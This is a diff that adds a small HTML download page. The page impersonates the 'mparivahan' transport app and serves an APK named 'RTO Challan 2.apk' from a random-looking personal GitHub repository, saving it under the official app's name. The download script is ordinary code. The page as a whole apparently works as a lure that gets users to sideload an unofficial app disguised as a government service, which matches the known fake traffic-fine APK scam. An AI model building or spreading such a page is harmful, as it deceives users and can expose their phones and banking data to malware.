@@ -1,0 +1,90 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Download mparivahan</title>
+  <style>
+    body {
+      font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      margin: 0;
+      background: #f3f4f6;
+    }
+    .card {
+      background: #fff;
+      padding: 24px;
+      border-radius: 12px;
+      box-shadow: 0 6px 24px rgba(15,23,42,0.08);
+      text-align: center;
+      max-width: 420px;
+      width: 100%;
+    }
+    h1 { font-size: 18px; margin: 0 0 12px; }
+    p { color: #555; font-size: 14px; margin: 0 0 18px; }
+    button {
+      background: #0369a1;
+      color: #fff;
+      border: none;
+      padding: 12px 18px;
+      font-size: 15px;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    button:disabled { opacity: 0.6; cursor: default; }
+    .note { margin-top: 12px; font-size: 13px; color: #666; }
+  </style>
+</head>
+<body>
+  <div class="card" role="region" aria-label="Download area">
+    <h1>mparivahan</h1>
+    <p>Click the button below to download the APK file.</p>
+    <button id="downloadBtn">Download APK</button>
+    <div class="note" id="status"></div>
+  </div>
+
+  <script>
+    // File URL provided (shorter raw.githubusercontent.com URL)
+    const FILE_URL = "https://raw.githubusercontent.com/jitendra0kumar2-debughsjsjskek/Mparivahan/main/RTO%20Challan%202.apk";
+    const SUGGESTED_NAME = "mparivahan.apk";
+
+    const btn = document.getElementById("downloadBtn");
+    const status = document.getElementById("status");
+
+    btn.addEventListener("click", async () => {
+      btn.disabled = true;
+      status.textContent = "Preparing download…";
+
+      // Try to fetch the file and force a download via Blob (works when CORS allows it).
+      try {
+        const res = await fetch(FILE_URL, { mode: "cors" });
+        if (!res.ok) throw new Error("Network response was not ok: " + res.status);
+
+        const blob = await res.blob();
+        const url = URL.createObjectURL(blob);
+
+        const a = document.createElement("a");
+        a.href = url;
+        a.download = SUGGESTED_NAME;
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+        URL.revokeObjectURL(url);
+
+        status.textContent = "If the file didn't start downloading automatically, it should be in your browser's Downloads.";
+      } catch (err) {
+        // Many GitHub raw/redirect endpoints block cross-origin fetch — fallback to opening the link directly.
+        console.warn("Fetch failed, falling back to opening the link:", err);
+        status.textContent = "Direct download unavailable due to browser/CORS restrictions — opening link in a new tab.";
+        // Open the URL in a new tab; user can then save/download from GitHub.
+        window.open(FILE_URL, "_blank", "noopener,noreferrer");
+      } finally {
+        btn.disabled = false;
+      }
+    });
+  </script>
+</body>
+</html>
